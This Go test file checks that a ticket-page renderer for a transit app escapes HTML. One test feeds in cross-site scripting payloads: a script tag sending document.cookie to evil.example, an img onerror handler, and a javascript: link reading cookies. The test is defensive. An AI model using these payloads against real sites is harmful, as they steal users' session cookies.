package owasptop10

import (
	"strings"
	"testing"
)

func TestRenderTicket(t *testing.T) {
	var b strings.Builder
	err := RenderTicket(&b, Ticket{Passenger: "Wanjiku", Route: "111 Ngong", Seat: 4, ProfileURL: "https://twende.example/u/1"})
	if err != nil {
		t.Fatalf("RenderTicket: %v", err)
	}
	want := `<h1>Tiketi ya Wanjiku</h1>
<p>Route 111 Ngong, seat 4</p>
<a href="https://twende.example/u/1">Profile</a>
`
	if b.String() != want {
		t.Errorf("page\n got: %q\nwant: %q", b.String(), want)
	}
}

func TestRenderTicketEscapes(t *testing.T) {
	var b strings.Builder
	err := RenderTicket(&b, Ticket{
		Passenger:  `<script>fetch("https://evil.example/?c="+document.cookie)</script>`,
		Route:      `<img src=x onerror=alert(1)>`,
		Seat:       1,
		ProfileURL: `javascript:alert(document.cookie)`,
	})
	if err != nil {
		t.Fatalf("RenderTicket: %v", err)
	}
	page := b.String()
	for _, bad := range []string{"<script>", "<img", "javascript:"} {
		if strings.Contains(page, bad) {
			t.Errorf("the page contains %q unescaped:\n%s", bad, page)
		}
	}
	for _, good := range []string{"&lt;script&gt;", "&lt;img", `href="#ZgotmplZ"`} {
		if !strings.Contains(page, good) {
			t.Errorf("the page should contain %q (escaped by html/template):\n%s", good, page)
		}
	}
}
